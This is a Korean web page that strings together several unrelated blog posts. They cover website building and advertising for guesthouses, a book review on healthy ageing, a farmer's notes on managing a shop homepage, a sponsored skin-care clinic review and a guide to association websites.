펜션웹은 팬션광고를 비롯하여 그에 맞는 홈페이지 제작과 관리에 대한 정보를 여러분들에게 제공해드릴까 합니다.   팬션광고도 중요하지만 그 이전에 우선 기본적으로 홈페이지 정도는 있으셔야겠죠. 저희는 홈페이지 제작은 물론 기존의 낡은 홈페이지를 현 트렌드에 맞게 감각적으로 리빌딩도 해드리고 있습니다. 홈페이지는 홍보에 있어서 매우 중요합니다. 예약 시스템은 물론 여러 펜션의 실질적인 정보를 더욱 정확하게 제공할 수 있고 무엇보다 홈페이지 존재 자체만으로 만들어내는 소비자들로부터의 신뢰와 믿음은 절대적으로 이 홈페이지와 그 퀄리티를 통해 구축할 수 있습니다.    저희는 각 팀의 전문가들이 모여 펜션에 대한 사전조사를 통해 분석하고 컨셉과 테마를 기획하는데요. 기획은 한 프로젝트의 시작이자 끝이니 만큼 확실한 기획이 나오지 않으면 절대 작업을 시작하지 않습니다. 기획팀, 디자인팀, 미디어팀, 홍보팀을 따로 두고 있는 만큼 기획 이후 모든 작업들은 동시다발적으로 진행이 되고 신속한 제작과 함께 최상의 퀄리티 역시 이루어 낼 수 있죠.  모든 디자인들은 홈페이지 방문자들의 시점에 맞게 배치되고 구성되어 최상의 시인성을 자랑하고 펜션 내부, 외부를 담은 사진과 영상 컨텐츠들은 새로운 시각과 정보를 제공합니다.        ' 해당 이미지들은 모두 펜션웹에서 제작하고 현재 운영 중인 펜션 홈페이지의 이미지들입니다. 저희는 확실한 기획을 바탕으로 해당 펜션마다 가지고 있는 고유의 매력을 확실하게 끌어내고 최상의 퀄리티로 디자인해드립니다.    홈페이지를 제작하였다면 이제 소비자들에게 알리고 세상에 내세우는 팬션광고가 본격적으로 시작이 됩니다. 저희 펜션웹은 홍보에 있어서 단순히 열심히 한다는 추상적인 말보다 눈에 보이는 확실한 계획과 구체적인 전략을 여러분들에게 제시합니다.    팬션광고는 기본적으로 인터넷을 포함하고 있는 만큼 펜션을 이용하고 예약하는 고객님들의 연령층과 그에 맞게 타깃을 설정하는 것부터 시작합니다. 주 고객층이 홈페이즈를 알게 된 검색 경로를 역으로 따라가 최적의 검색 단어들을 추출해내고 그것을 바탕으로 검색을 하였을 때 여러분들의 펜션이 언급이 되고 검색 결과 창에 나타날 수 있도록 상위 노출을 지속적으로 작업하고 지원해드립니다.    그리고 약 24개의 쇼핑몰에 여러분의 펜션을 입점 시켜 드립니다. 쇼핑몰에 펜션을 입점하는 게 절대 쉬운 게 아니죠. 준비해야 할 부분들도 정말 많고 그 절차 역시 매우 까다롭습니다. 그리고 이러한 모든 과정을 수행한다고 해서 100% 입점이 된다는 보장도 없다 보니 하염없이 신청하고 기다리는 시간도 너무나도 아깝죠. 펜션은 여러분만 있는 것이 아니고 쇼핑몰 입점만 되면 그 홍보 효과는 확실하다 보니 전국에 수많은 펜션들과 입점 경쟁도 하게 됩니다.    저희 펜션웹은 약 24개의 쇼핑몰과 현재 협력관계에 있습니다. 저희에게 맡겨주시면 수많은 절차와 낭비되는 시간 없이 한 번에 24개의 쇼핑몰에 여러분의 펜션을 입점시켜 드립니다.  확실한 마케팅 효과를 저희를 통해서 제대로 누려 보세요!     인터넷이어서 더욱 중요한 홈페이지 관리도 확실하게 해드려요. 여러분의 선택에 의한 부분이지만 홈페이지 다운, 버벅임으로 인한 불편함 등 여러 문제들을 미지 방지하고 빠르게 해결해드리며 홈페이지 정보 수정과 같은 기본적인 모든 관리들을 저희가 해드립니다.     제작, 관리, 홍보에 필요한 모든 작업을 저희는 회사 자체적인 기술력만으로 적용하여 만듭니다. 일부 제작 컨텐츠들을 하청하는 것과 같은 꼬리물기식 제작을 하지 않습니다. 그래서 거품이 없고 저렴한 가격으로 이 모든 것들을 만나 보실 수 있는데요. 현재 저희는 홈페이지 제작 시 50% 할인이라는 파격적인 프로모션 이벤트를 진행 중입니다. 이번 기회 놓치지 마시기 바랍니다!     펜션 홈페이지를 제작하고 관리하여 팬션광고까지 모든 것을 원스톱으로 확실하게 해결하고 싶으신가요? 그렇다면 펜션웹에 언제든 문의를 주세요!​▶ 홈페이지 바로 가기 클릭 ◀​▶ 연락처 바로 가기 클릭 ◀070-4443-7421 건강하게 나이 든다는 것 한국건강관리협회 국민건강보험공단홈페이지 _해피해라 꿈희영5060 건강하게 나이 든다는 것 한국건강관리협회 국민건강보험공단홈페이지 _해피해라5060 꿈희영​2021년 홀수년 이죠.태어난 년도의 마지막 숫자의홀짝 에 따라 건강검진을 받아야죠.​​건강하게 나이를 들기위해서는 미리 예방하는 것이 제일 중요할 것 같아요.​해피해라 5060 꿈희영이 건강에 대해 관심이 많아요.말 그대로 팔팔하게 잘 살아야죠.​ ​​목차들어가며​제1부 언제까지 건강하게 살 수 있을까​1. 장수 유전자 미스터리122세 할머니의 장수 비결 / 텔로미어를 둘러싼 소동 / 남녀의 수명이 차이 나는 이유 / 유전자를 젊게 되돌릴 수 있을까​ ​2. 아픈 사람은 몸만 아픈 게 아니다우리가 두려움을 느낄 때 / 왜 우울한 사람이 더 아플까 / 죽음을 부르는 신경 / 걱정과 불안이 장에 미치는 영향 / 가짜약의 효능 / 스트레스가 오작동하면 내 몸에 생기는 일​​​3. 오래 사는 사람들의 호르몬길들인 몸과 사회화한 마음 / 옥시토신 회로가 연결되는 방식 / 사랑할수록 건강해진다 / 좋은 호르몬을 많이 갖고 싶다면 / 흰자위와 분홍색 입술​​ ​​제2부 외롭지 않고 아프지 않게​4. 몸에 좋은 것들의 배신영양제와 슈퍼푸드의 오류 / 유기농 식품은 얼마나 몸에 좋을까 / 로제토 마을에서 생긴 일 / 진짜 신경 써야 할 것은 따로 있다​5. 외로우면 아프다잠 못 드는 고독한 사람들 / 소외된 사람들의 유전자 / 따뜻한 차 한 잔의 중요성 / 외로움이 보내는 신호 / 주관적 고립, 객관적 고립​6. 단짝 효과결혼반지가 심장마비를 막는다 / 부부싸움과 허리둘레 / 우정이 수명에 미치는 영향 / 오래 살게 해줄 친구를 만나는 법 / 운동과 우정 사이​ ​​7. 공감의 마법테스토스테른이 공감 능력을 위협한다 / 감정 문해력을 기르는 일 / 동시성의 과학 / 사회적으로 통합된 삶​8. 이타적 행동이 유전자를 바꾼다양육과 흡연의 공통점 / 나눔과 스트레스에 관한 실험 / 건강을 가져다주는 공동체의 조건 / 헬스장보다 자원봉사​9. 성격이 우리를 죽인다감정이 뇌를 바꾼다 / 수명을 갉아먹는 위험한 성격 / 경계해야 할 것​​ ​​​10. 노화의 속도를 조절하는 법명상가들의 DNA / 마음챙김과 치유에 관한 연구 / 텔로미어를 변화시키는 심신 훈련 / 명상의 가장 큰 효능​11. 대체할 수 없는 장수의 조건채소가 답이 아니다 / 일본 노인들의 남다른 생활방식 / 살 만한 가치가 있는 삶 / 지금 시작할 수 있는 일한국건강관리협회 ​​​​ [저자소개 : 마르타 자라스카 Marta Zaraska]​건강, 심리, 환경 등 오늘날 인류가 직면한 문제들에 대한 과학적 해답을 탐사하는 전방위적인 과학 저널리스트이다. <워싱턴포스트>, <사이언티픽 아메리칸>, <뉴사이언티스트>, <디스커버> 등 유수의 언론에 기고한다. 마르타 자라스카의 과학 기사는 미국, 스페인, 러시아, 독일, 폴란드 등 많은 국가에서 텔레비전 프로그램으로 제작 방영되었다. 북아메리카와 유럽의 여러 라디오 방송과 인터뷰하고 TEDx 강연 연사로도 초청받는 등 과학 대중화를 위해 활발히 활동한다. 다수의 과학 다큐멘터리 영화에 전문가로 참여했다.​2016년 출간한 첫 저서 『고기를 끊지 못하는 사람들MEATHOOKED』은 그해 <네이처> ‘최고의 과학책’으로 선정되었고, 한국을 비롯해 세계 각국에서 번역 출간됐다. 마이클 셔머, 피터 싱어 등 과학 분야의 세계적 석학들과 『육식을 줄이는 해법The Reducetarian Solution』을 공동 집필했다.​ ​자라스카는 스마트폰과 소셜미디어가 낳은 관계에 대한 또 다른 불만인'퍼빙' 또한 이런 현상을 가속할 것이라 우려해요.​'무시하기 snubing' 와 '전화기 call'의 합성어인 퍼빙은 스마트폰에 빠져 주변 사람을 외면하고무시하는 현상을 말해요.​​공동체로부터 배척된다는 느낌은심리적으로만 아니라신체적으로도 고통을 느끼게 하죠.​가상의  참가자와 공을 던지고 받는'사이버볼' 게임에[서 자신이 게임에 끼지 못하고 소외된다고 느끼는 참가자의 뇌에서는 신체적 고통에 반응하는 신경망이 활성화 되었대요.​​바쁜 현대인들은 채소와 과일을 몇 그램 먹었는지,비타민 함유량이 얼마인지,하루에 몇 킬로미터를 뛰었는지 등손쉽게 측정할 수 있는 건강법을 선호하죠.​​하지만 과학적 연구 결과는 덜 걱정하고,가족 또는 친구와 더 많은 시간을 보내고,이웃에게 더 친절하고, 더 많이 웃는 일처럼 측정된지 않는 것들의 효과에 주목하라고 말하고 있어요. ​​결국 건강하게 나이드는 가장 좋은 방법은 더 나은 인간으로 성장하는 것임을,마라스카는 이 책을 통해 이야기 하고 있어요. ​​다양한 방법을 공유하는 건강하게 나이 든다는 것 꼭 읽어보세요!!!!​​ 정말  친절을 더 나누고더 부비 부비 하고더 눈을 마주치며 건강하게 나이를 들어가면 좋겠지요. ^^ ​​ 건강하게 나이 든다는 것 저자마르타 자라스카출판어크로스발매2020.12.28. ​​건강은 건강할 때 잘 지킵시다!!!​​​ 건강하게 나이 든다는 것 한국건강관리협회 국민건강보험공단홈페이지 _해피해라5060 꿈희영 ​​  국민건강보험공단 홈페이지확인할 수 있어요.내 건강검진 일자를 말이죠.클릭해서 확인해보세요.  국민건강보험방문자별 맞춤 메뉴 개인 사업장 개인 맞춤 메뉴 자격득실 확인서 발급 환급금 조회/신청 보험료 조회/납부 본인부담 상한액조회 보험료 계산기 재난적의료비 지원안내 건강검진 대상조회 가족 건강관리 민원 서식자료실 1 / 3 안녕하세요 공단홈페이지 방문을 환영합니다. 2021년도 건강보험료 및 장기요양보험료 인상 내 보험료 조회하기 국민의 건강을 위해! 새롭게 달라진 건강보험공단 홈페이지 이용안내 안녕하세요 공단홈페이지 방문을 환영합니다. 2021년도 건강보험료 및 장기요양보험료 인상 내 보험료 조회하기 Prev Next Stopwww.nhis.or.kr ​  ​ 한국건강관리협회 홈페이지이 곳에서는 건강검진도 예약할 수 있어요. 감염병의 예방 및 관리에 관한 법률에 따라 제5군 감염병 예방사업을 지원하며,비전염성 만성질환과 보건복지부장관이 국민보건의료 시책 상 필요로 하는질환의 조기 발견, 예방을 위한 효율적인 건강검진과 치료, 역학적 조사연구 및보건교육을 실시하여 국민건강증진에 기여함을 목적으로 한다.​ ::: 한국건강관리협회메인으로바로가기 메뉴로바로가기 콘텐츠로바로가기 카피라이트로바로가기 사이트맵 사이버교육센터 검진예약 예약확인 결과조회 예방접종예진표 사전작성 전국검진 센터소개 나에게 맞는검진 검진프로그램 기업검진안내 검진절차 검진시주의사항 제증명 발급 (구.보건증 포함) 간편 예약 검진상담신청 펼치기 새소식 학대피해아동지원사업 후원금... 공지사항 2021년 한국건강관리협회 건강증진분야 학술연구... 2021년 한국건강관리협회 기생충 분야 학술연구... 2021년 한국건강관리협회 기생충 분야 학술연구... 2021년 한국건강관리협회 건강관리분야 학술...www.kahp.or.kr ​​​​ ​A.효성에프엠에스는 고객님의 이용 편의를 위해서 고객님의 홈페이지(관리프로그램)와의 연동할 수 있도록 시스템을 구비하고 있습니다. ﻿홈페이지관리 파트너 ﻿​도움 고맙다​​​제철과일과 사과즙을 취급하다보니 홈페이지관리 마찬가지로 파트너 도움과 함께 ​블로그 SNS 도구와 함께 주요한 일이다.​메인 홈페이지관리는 블로그 SNS기반 구축하고 실전한다고 ​내가 파트너 에게 전해줘야 할  원고작성이 상당히  지연되고 있다.​이제는 홈페이지관리 플러스 카카오 광고까지 비용을 들여서 같이 돌아가기때문에 ​매일 글,사진 올리고 댓글, 반응 등 이웃관리도 해야하고 ​그러다보니 매일 밤늦게까지 일이 진행이 되고 있다.​오늘은 밤을 새워 서워서라도 홈페이지관리 자료를 넘겨야 파트너 도움으로 ​부사사과, 사과즙 화면들이 빨리 홈페이지관리 화면에 노출이 될 수 있다.​​​​​​​오늘 파트너 도움 으로  메인 홈페이지관리 화면에 블로그, SNS 사이트 위젯 설치가 완료되었다​​​​​​​​메인 홈페이지관리 화면에서 이용약관, 사업자정보,통신판매업신고증,에스크로 등록 등​소비자 보호를 위한 정보제공과 안전장치가 구비되어있어야 ​다른 SNS 도구들도 같이 연동이 되어 마케팅과 거래를 할 수 있다 ​ ​​​​​​​지금 부사사과가 벌써 입고 되었고 사과즙도 마케팅을 하고 있는데 ​ 홈페이지에는 ​아직 않 올라와있다.​ 일에 바쁘다보니 아직 원고를 파트너 에게 넘기지 못하​고 있기때문이다​​​​​​​제철과일,농산물별로 시즌별로 상품코드를 형성해야 한다.  ​​이 코드분류는 내가 직접 만들었다​​​​​​​​홈페이지관리​ 작업으로 이 기초 원고를 줘야 쇼핑몰에 자료를 올릴수 있다​​​  상품분류, 명칭, 중량, 상품코드, 가격 등을 전한 자료도 전해줘야한다  ​  앞에서 전해준 원고로 파트너 작업이 이뤄진다   ​  상세내용까지 사진보정도 하고 레이아웃을 만들고 편집을 한다 파트너 도움으로 자료를 전달받고 확인하고 수정, 보완, 이상이 없으면 OK ~~ 이렇게 해서 쇼핑몰에 올라가게 된다   ​  농민의 일상, 붓 가는대로 메뉴의 글도 많이 올리지 못했는데 시간이 나면 몇건씩 올려야 한다 그래야 홈페이지가 정체되어 있지않고 돌아가게 된다   ​​​과일 이야기도 사과즙 내용을 보완해서 올려야한다.​어이쿠 일이 참 많다~~​블로그, SNS 마케팅 교육받으면서 실전하고 그러다 보니​상당한 시간이 여기에 소요되고 농사 일, 홈페이지 작업 그런게 자꾸 밀려나게된다.​​오늘은 꼭 원고 작업해서 넘겨야한다.​항상 재능기부식으로 실비만 받고 나를 도와주는 ​파트너 DKLIM과 정대현 실장님께 감사의 마음을 전한다^^​​​​​​ ​​​​​​​​​​​​ ​﻿인터넷 시대에 홈페이지 관리하기   홈페이지를 볼 때에 PC로 볼 때가 있고 노트북 컴퓨터로 볼 때가 있습니다. 며칠 전에 어떤 홈페이지로 전화를 해서 노트북에서 잘 안보인다고 알려 주었는데 그 곳 담당자가 자신의 노트북으로는 잘 나온다고 전화를 한 내 쪽에 문제가 있다고 해서 전화를 끊은 적이 있었습니다. 자 그러면 바로 그 한가지만 생각하면 그 사람의 이야기가 맞는 것 같지만 내가 볼 때 다른 많은 홈페이지는 잘 보이는데 그 홈페이지와 또 한 군데가 메인 화면 메인 메뉴에 이상이 있는데 .... 전화를 한 사람에게 무안을 준 것입니다. 내가 볼 때에 그 홈페이지에 바로 고쳐야 할 부분이 분명이 있는데 말입니다. 사무실에서 일을 하다보면 피곤해서 실수를 할 때도 있으니 그 부분을 탈잡으려고 하는 것이 아니라 사람이 실수를 할 수가 있습니다. 자기 자신의 모습을 살펴보기가 어렵기 때문에 누군가 자신의 모습에서 수정을 해야 하는 부분을 알려 주는 것은 험한 세상에서 바로 자신에게 도움을 주려는 사람에게 기분나쁨을 안개주는 것을 발생시키는 것이 됩니다.  이런 경우의 정답은 일단 그 홈페이지에서 원격지원제도를 실행을 해서 아주 간단히 원격으로 접속을 해서 내 컴퓨터로 들으와서 다른 사이트를 확인을 하고 그 문제가 일어난 자기 자신의 사이트를 보면 분명히 확인을 할 수가 있는 문제인데 이런 확인을 하지를 않고 그냥 의견을 묵사발로 만들면 자신에게 호감을 가지는 사람에게 적대감 내지 무관심으로 돌리게 만드는 것이 됩니다.  바로 이런 면이 있기 때문에 인생을 살아 나간다는 것이 간단치가 않는 면이 있습니다. 잠시라도 실수를 할 수가 있는데그 실수가 어떤 다른 결과로 연결이 될 지 예측을 할 수 없으므로 가능한 실수를 줄이도록 하는 것이 좋으며 또한 어떤 새로운 사실을 알려 줄 때는 보다 차분하게 확인을 하는 과정이 필요합니다. 인터넷 시대는 지식 폭발의 시대이고 또한 컴퓨터의 경우 별의별 상황이 다 있을 수 있어서 보다 차분한 대응이 필요합니다.           ﻿ ​안녕하세요 !! 꼼꼼한 제작을 통해 믿고 맡길 수 있는 맞춤형 홈페이지제작감각디자인 입니다 ~ ㅇㅅㅇ!감각디자인은 맞춤형 홈페이지 제작전문업체로,고객님이 원하시는 교육 홈페이지를 제작드리기 위한 다양한 홈페이지 제작 경험과 노하우를 가지고 있으며원하시는 내용을 정확하고 빠르게 파악 및 분석하여 생각하고 계시는 그대로완벽하면서도 퀄리티높게 홈페이지를 제작해 드리고 있어많은 분들이 찾아주시고 홈페이지 제작문의를 주시고 있습니다.이렇게 말로만 적어놓으면 어떤 제작업체인지 빠르게 와 닿지가 않으실 텐데요...그래서 오늘은 감각디자인에서 교육분야 홈페이지를 어떻게 제작하는지제작과정 및 제작관련 팁과 노하우를 간단하게 알려드리겠습니다. 우선, 홈페이지를 제작하시기로 결정하셨다면어떤 업체에 홈페이지 제작을 의뢰해야 좋을지 고민이 많이 있으실 겁니다.맞춤형 홈페이지 제작은 고객님이 원하시는 내용에 맞춰 처음부터 하나하나 제작이 되기 때문에제작업체의 기술력과 실력이 곧 홈페이지의 퀄리티와 완성도로 나타나게 됩니다.​그래서, 임대형 홈페이지 제작과는 다르게 제작업체를 선정하실 경우에는 많은 업체를 알아보시고 신중하게 선택하셔야 좋은 결과물을 받아보실 수 있습니다.저희 홈페이지에 오시면 다양한 메뉴구성 / 디자인 / 기능 / 컨셉들로특징과 장점을 잘 살려 제작된 교육 홈페이지들을 확인하실 수 있으며,19년 경력의 홈페이지 제작 경험과 노하우를 바탕으로고객님께서 원하시는 홈페이지가 어떤 것이더라도 가능한 선에서 요청사항에 맞게 제작해 드리고 있어꾸준히 다양한 홈페이지들이 제작되고 있는것도 어렵지 않게 확인하실 수 있습니다.홈페이지 제작을 계획하셨다면 어디에서나 볼 수 있는 디자인과 구성의 개성이 없는홈페이지로 제작하여 사용하는 것 보다는컨셉과 개성을 잘 살린 '우리' 만의 교육 홈페이지로 제작하시는 것이좀 더 많은 사람들에게 브랜드이미지 상승과 효과적인 홍보효과를 줄 수 있어추후 홈페이지 관리나 사용에 있어 좀 더 효율적이라고 할 수 있습니다.​맞춤형 제작방식으로 홈페이지 제작을 진행하시게 되면홈페이지 제작 완료 후에도 직접 수정 및 업데이트를 하시면서 사용하실 메뉴들은프로그램으로 개발을 드려 관리자가 관리자모드를 통해 언제든지 어렵지 않게 변경 작업이 가능하다는 장점이 있으며디자인 적으로도 얼마든지 원하시는 방향과 구성으로 홈페이지를 제작하실 수 있어퀄리티 측면에서도 높은 만족도를 얻으실 수 있습니다.감각디자인과 함께 홈페이지 제작을 진행하시게 되면전문가가 고객님과 지속적인 커뮤니케이션을 통해 원하시는 내용을 빠르고 정확하게 파악 및 확인한 후기획 & 디자인 & 코딩 & 개발 부분을 단계별로 진행하며 별도로 외주를 주지 않고 100% 자체제작을 통해합리적인 비용에 높은 퀄리티와 완성도로 홈페이지 제작을 진행드리고 있습니다.​홈페이지 제작 전, ＃서울 ＃경기 ＃인천 지역은 직접 방문미팅드려자세하게 내용정리와 상담을 진행드리고 있으며, 놓치실수도 있는 부분도 꼼꼼하게 확인하여추가적인 제안도 드리고 있어 미팅이 가능하신 지역에 계신 분들은 한번 미팅을 진행해 보시기 바랍니다.감각디자인 홈페이지에 오시면 다양한 업종과 분야의 홈페이지들을 둘러보실 수 있어대략적인 홈페이지 퀄리티와 기능구현등을 확인하시고'우리' 만의 높은 퀄리티의 홈페이지를 제작하여 사용하시기 바랍니다.홈페이지 제작과 관련하여 궁금하신점이나 문의하실내용이 있으시다면편하신 시간에 연락 및 문의주시면 자세한 설명 및 안내 진행드리겠습니다 !!!△∪ 클릭 ~ 감각디자인 홈페이지 바로가기 !!! ∪△ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가작년 10월부터 시작하여 꾸준한 매출상승이 지속되어지고 있다.현재 지마켓에만 입점되어진 상태이며 추후 여러오픈마켓까지 모두 입점할예정이다.판매상승이 지속되는 것으로보아 다른곳의 입점후에도 많은 성과를 기대해 볼만하다.[셀러온 홈페이지 보러가기]​ ​ 유난히 피부가 약한 사람들이 있어요. 요즘처럼 날씨가 환절기로 다가오면 피부가뒤집어지고 마스크도 매일 끼다 보니까열이 올라와 트러블이 잔뜩 올라오는 분들이요! 집에서 암만 관리를 해줘도 바뀌지않는 피부 트러블에다가 화장으로도가려지지 않으면 답도 없더라구요ㅠ 남 얘기 처럼 말하고 있지만 사실이건 제 얘기랍니다. 아니 였답니다!왜냐면 전 이제 트러블로 고생 끝났답니다~강남피부관리 덕을 톡톡히 본 덕분이더라구요.  ​ 저도 첨엔 집에서 마스크팩도 하고트러블에 좋다는 연고도 발라주고딥 클렌징 위한 제품도 사고 별걸다 시도해봤는데 바뀌지 않아서결국 관리샵을 방문하게 되었답니다.  근데 1회차를 받아봤는데 넘 만족해서제대로 받기 시작했는데 어느덧 5회차까지끝나게 되었답니다! 이 때부터는 거짓말처럼피부도 너무 좋아져서 아예 20회 코스를끊고 다니고 있는 중이랍니다~ 친구들도 절 보면 피부가 많이좋아졌다며 화장품 뭐 쓰고 있냐~하나도 안따서 예쁘다면서매일 칭찬을 듣고 있을 정도로덕을 보고 있는 중이더라구요. ~ ​  이 곳을 찾기 위해 얼마나 많은노력을 했었는지 ㅠㅠ 그래도그 덕분에 이렇게 덕보고 있어요! 피부로 인해 매일 스트레스를 받던게일상이라 샵을 고를 때에 정말신중하고 꼼꼼하게 비교해서 골랐답니다! 요즘 시국이 시국인지라 경제적으로부담되지 않으면서 실력까지 최고인그런 곳에 방문하고 싶더라구요 그래서 정말 각종 커뮤니티는다 들어가서 리얼후기들을 찾아본 뒤신중하게 결정해 방문한 곳이였답니다! ​  워낙 후기도 좋았고 실력이 으뜸이라고하고 드라마 촬영하셨던 노지훈님께서도이곳에서 관리하고 계시다고 할 정도로유명한 곳이 있었는데 제가 지금 다니는KN바디앤스킨이라는 곳이였죠.  ​ KN바디앤스킨서울특별시 강남구 테헤란로1길 28-14 02-564-2477강남구 테헤란로 1길, 28-14, 401호 (시티빌딩) ​  방문성도 좋았고 집과 가까워 홈페이지에서관리프로그램을 살펴보게 되었는데 강남피부관리뿐만 아니라 경락도 같이 받아볼 수 있는코스가 있어 선택하지 않을 이유가 없더라구요.  방역도 꼼꼼하게 하고 계시고예약이 필수라고 할 정도로인기가 많아 신뢰가 갔어요요즘 같은 시국에 사람들과 부대끼며대기하면 불안한데 예약시스템으로운영되서 그런 걱정은 들지 않더라구요.  ​  상담을 진행하면서 좋았던 점은그냥 비용만 지불하면 바로 진행되는게아니라 진행할 수 있는 상태인지까지도체크리스트로 확인하고 진행해 주셨어요.  그리고 육안으로 보이는 피부상태와실제 피부가 어떤 상태인지를 제 고민은어떤건지 정확하게 파악한 다음 고민해결을위한 최고의 솔루션을 제안해 주시더라구요.  ​  여러가지 솔루션 중 저는 여드름 관리프로그램을 선택해서 받고 있더라구요여드름진정에다가 얼굴라인까지잡아볼 수 있는 경락까지 해주셔서강남피부관리 하면서 얼굴 비대칭도두 마리 토끼를 잡을 수 있었어요~ ​  선택이 끝나고 나선 탈의실로 안내해주셨고환복하고 프라이빗한 룸으로 들어갔는데요아무래도 전 옆에 사람이 있는게 싫었는데1인실 커플실 다인실 등 취향에 맞게선택할 수 있는 룸이 다양해서 좋았답니다!저는 프라이빗한 1인실 선택했어요! ​  본격적인 관리에 들어갔는데 여기는 경력이 10년이넘은 분들이 많이 있어서안그래도 후기에서 실력이완전 좋으시다고 소문이 자자하던데기대감이 커서 설레었어요.  ㅎㅎ ​  먼저 피부를 깨끗하게 클렌징 해주시고깊은 곳까지 깨끗하게 해주시기 위해딥클렌징까지 꼼꼼하게 해주셨죠! 근데 확실히 전문가가 해주셔서 그런지집에서 혼자 하는 것보다도 훨씬시원하면서 깨끗해진 느낌을 받았어요.  ​  피부를 깨끗하게 만든 상태에서 본격적인경락이 시작되는데 테콜테 부분을 먼저집중적으로 풀어주시더라고요! 이게 목 어깨부분을 일컫는 말인데 이 곳을 먼저 풀어야얼굴마사지를 할 때에도 효과를 배로 볼 수 있고강남피부관리 효과도 커진다고 하더라구요.  ​  그 다음으론 얼굴마사지에 들어갔는데큰 고민은 아니었지만 얼굴 비율이미세하게 달라 고민이 많았답니다.  그래서 관리사분께서 양쪽 세기를 다르게특별한 스킬을 발휘해서 이쪽은 눌러주고이쪽은 마사지해주고 해주셨어요.  ​  다음은 수분앰플을 투여해서피부에 노폐물이 빠진 자리에수분을 채워주는 과정도 진행했는데요 촉촉한 느낌도 나고 경락하면서얼굴이 화끈해졌던게 어느정도진정되었답니다 그 다음으로는피부를 진정해주기 위한 차콜 모델링마스크를 해주셨답니다. 시원한 팩을올려주니까 얼굴의 열도 싹~ 내려가면서진정되는 기분이 드니까 좋더라구요!ㅎ ​  그 다음으론 전체적인 마무리를 해주셨어요원하시는 분들은 따로 기초화장까지해주신다고 해요. 대박! 저는 자차를이용해서 방문했기에 쌩얼도 상관없어서그냥 패스하고 이렇게 마무리 되었어요 ​  아까 말했듯 오늘이 5회차였는데정말 트러블이 있던 자리는 아직살짝 남아있지만 전체적인 트러블이많이 진정됬고 없어졌어요 . 가려움증도많이 없어졌는데요! 추운날 바람이 불어도따갑지 않게 됐어요! 그리고 제일 좋았던점은 얼굴라인의 변화에요비포 애프터를 위해 같은 장소에서매번 촬영을 했었는데 얼굴 라인이점점 균형이 맞아가는게 보이더라구요~그래서 더욱 만족감이 높았어요.  ​  이번에 5회차 받은 후로는지금 신규고객에 한해서 50%할인 이벤트 덕도 봐서20회차로 끊었는데매번 받을 때마다 얼마나 달라질지상상만해도 너무 설레고 좋아요.  ㅎㅎ 20회차 끝나면 석고상으로 비포 애프터를비교할 수 있고 전시까지 할 수 있는데얼른 자신있게 전시하고 싶어요~ ㅎㅎ ​  주위친구들의 부러움과 칭찬을매일 듣고 있어 너무나 만족스럽게강남피부관리 덕보고 있는 중이에요~! 주름 화이트닝, 진정 패키지도 따로있으니 주저하지 말고 상담 진행해 보시길 바랄게요~여러분들도 KN바디앤스킨 덕보시길 바래요~! KN바디앤스킨서울시 강남구 테헤란로 1길, 28-14, 401호​-위 포스팅은 해당업체로부터 소정의 원고료를 지원받아 작성되었습니다-   ​기업 홈페이지협회 홈페이지병원 홈페이지조합 홈페이지​...​다 같은 홈페이지이지만업종, 성격에 따라 특성도 달라집니다.강조해서 넣어야 하는 기능이나필수 기능에 다소 차이가 있으므로어떤 홈페이지를 제작할지 결정했다면해당 업종 홈페이지 제작 경험이많이 누적된 업체를 선택해야 하는데요.​그렇다면 협회홈페이지는어떻게 제작해야 할까요?​지금부터 홈페이지제작.kr에서알려드리도록 하겠습니다!​  ​ 협회, 홈페이지가 필요한 이유​협회나 조합의 경우되도록 홈페이지를 제작하는 것이 좋습니다.그래야 더 공적으로 보이기 때문입니다.​단순 페이스북, 인스타 등 SNS만 운영하면공식적으로 올려야 하는 자료를업로드 하는 데 한계가 있기도 하고협회 회원에게만 공개해야 하는 정보를올리는 것도 불가능합니다.​하지만 홈페이지가 있다면,협회의 활동을 일목요연하게정리하여 올릴 수 있음은 물론이고협회 회원들에게만 공개 가능한정보를 업로드 하는 것도 얼마든지 가능합니다.​더욱이 "공식 홈페이지"가 존재함으로써공식적으로 활동하는 협회, 조합임을드러낼 수 있어 신뢰도를 높일 수 있습니다.​  ​ 협회 홈페이지 필수 사항​협회 홈페이지는 회원 기능이 중요합니다.등급에 차등을 두기도 하고회원가입 시 필수로 입력하는 항목을 추가,또는 회원 등급별로 열람 권한이 달라지기 때문에일반적인 홈페이지보다 이런 회원 기능에중점을 두는 것이 필요합니다.​따라서 홈페이지 제작 전,어떤 식으로 회원 관리를 할 것인지 고민하여필수 입력 항목 등을 사전에 설정하는 것이 좋습니다.​또한 회원의 개인정보를 다루기 때문에보안서버인증도 필요할 것입니다.​그외에 자료 게시판 및 협회 활동 알림 게시판 등다양한 게시판이 들어가야하겠지요.​  ​ 참고사이트를 정하세요​하지만 우리 협회 홈페이지에어떤 기능이 들어가야 할지 구체적으로가늠이 되지 않고 막막하다면,비슷한 협회 사이트들을 살펴보면서벤치마킹 하는 것도 좋은 방법입니다.​그리고 필요한 기능이 구현되어 있는사이트를 참고사이트로 선정하여홈페이지 제작 문의 시 함께 주소 첨부해주신다면제작 업체가 해당 참고사이트를 바탕으로제작 견적을 내기 때문에 보다수월하고 구체적인 견적 안내가 가능해집니다.​제작 중간중간 기능을 추가하는 것보다,제작 전 어떤 기능을 넣을지 확실하게이야기 된 상태에서 진행되는 게제작 과정을 원활하게 만든다는 점 잊지 마세요^^​  ​ 독립형으로 제작하기​협회나 조합 홈페이지는 독립형으로제작하는 것을 추천드립니다.​임대형은 단어에서도 느껴지지만소유가 아닌 임대 형식의 홈페이지입니다.운영만 하고, 소유권은 가질 수 없어소스나 데이터 백업이 불가능합니다.​협회 홈페이지에는 많은 자료가쌓이기 마련이고,홈페이지는 오래 유지될 경우 추후리뉴얼을 하거나 아예 새로 제작하고는 하는데이때 기존 홈페이지에 있는 자료를백업할 수 없다면 곤란하겠지요.​독립형으로 제작하신다면홈페이지 소유권을 직접 가질 수 있고소스/데이터 백업은 물론 가능합니다.​또한 원하는 기능 개발이 자유로우며디자인 수정, 변경도 가능하기 때문에임대형 홈페이지보다 확장성도 넓습니다.​단, 독립형이라도 폐쇄형으로 제작될 시타 업체에 수정이나 유지보수를 맡기기 어려우므로되도록 독립형이면서 오픈소스형으로제작하는 업체와 진행하시기 바랍니다.​  ​ 모바일에서도 보기 편하게! 반응형으로​스마트폰 등장 이후로 이제는PC보다 모바일을 통한 접속량이훨씬 많아지는 추세입니다.​게다가 2020년부터는 언택트 등의 이유로온라인 시장이 더욱 활발해졌는데요.​PC버전 홈페이지만 제작되었던 